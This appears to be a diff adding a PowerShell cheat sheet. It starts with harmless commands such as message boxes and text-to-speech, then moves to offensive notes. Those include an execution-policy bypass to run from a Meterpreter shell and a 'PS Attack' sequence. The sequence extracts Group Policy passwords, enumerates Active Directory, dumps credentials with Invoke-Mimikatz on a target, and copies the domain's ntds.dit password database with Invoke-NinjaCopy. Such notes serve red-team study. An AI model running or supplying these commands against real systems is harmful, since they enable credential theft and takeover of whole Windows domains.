@@ -1,0 +1,84 @@
+PowerShell
+
+
+Write-Host 'Hello World!'
+
+Get-Command                   Show all commands.
+Get-Content
+Get-Eventlog system
+Get-Process                   Show current running processes.
+Set-Content
+------------------------------------------------------------------------------------------------------
+
+# Pop-up window
+
+[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+[System.Windows.Forms.MessageBox]::Show("<message>" , "<Windows title" , <# - button options>)
+
+Example:
+[System.Windows.Forms.MessageBox]::Show("Hello World!" , "Important Message" , 1)
+
+Button options:
+0  OK
+1  OK, Cancel
+2  Abort, Retry, Ignore
+3  Yes, No, Cancel
+4  Yes, No
+5  Retry, Cancel
+------------------------------------------------------------------------------------------------------
+
+# Speak
+
+(New-Object -ComObject SAPI.SPVoice).Speak(“Hello World!”)
+------------------------------------------------------------------------------------------------------
+
+# Error message
+
+The file Cannot be loaded because the execution of scripts is disabled on this system. Bypass it.
+
+powershell.exe -executionpolicy bypass -file <file>
+
+Use the same command to run a file remotely on a Windows system from an active Meterpreter shell.
+------------------------------------------------------------------------------------------------------
+
+# PS Attack
+
+Get-GPPPassword
+
+get-attack “active directory”
+get-help Get-NetUser
+Get-NetUser -UserName <user>
+
+get-attack groups
+get-help Get-NetLocalGroup
+Get-NetLocalGroup -GroupName “Administrators”
+---------------------------------------------------------
+
+Restart PS Attack and run as a local user Administrator.
+
+get-attack “local admin”
+Find-LocalAdminAccess
+
+get-attack find
+get-help Invoke-UserHunter
+Invoke-UserHunter -Examples
+Invoke-UserHunter -CheckAccess
+
+Get-Attack mimi
+get-help Invoke-Mimikatz
+Invoke-Mimikatz -ComputerName <target> -DumpCreds
+---------------------------------------------------------
+
+Restart PS Attack and run as a Domain Admin.
+
+get-attack “domain controller”
+Get-NetDomainController
+
+get-attack copy
+get-help Invoke-NinjaCopy -Examples
+Invoke-NinjaCopy -Path “C:\windows\ntds\ntds.dit” -ComputerName <target> -LocalDestination “C:\ntds.dit”
+(takes a little while)
+ls
+---------------------------------------------------------
+
+PS Attack build tool
